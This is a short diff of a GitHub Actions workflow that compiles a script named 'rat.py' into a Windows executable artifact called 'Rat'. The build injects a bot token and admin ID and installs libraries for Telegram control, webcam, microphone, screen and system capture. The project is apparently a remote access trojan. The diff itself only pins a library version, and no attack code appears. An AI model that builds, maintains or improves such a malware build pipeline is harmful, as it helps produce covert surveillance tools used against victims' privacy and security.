@@ -28,7 +28,7 @@ jobs:
       - name: Install dependencies
         run: |
           pip install pyinstaller
-          pip install python-telegram-bot pillow psutil requests sounddevice soundfile cryptography opencv-python numpy pycaw comtypes gputil win10toast
+          pip install python-telegram-bot==13.15 pillow psutil requests sounddevice soundfile cryptography opencv-python numpy pycaw comtypes gputil win10toast
       
       - name: Replace token and admin_id in rat.py
         run: |
@@ -52,4 +52,3 @@ jobs:
           name: Rat
           path: dist/*.exe
           retention-days: 1
-          
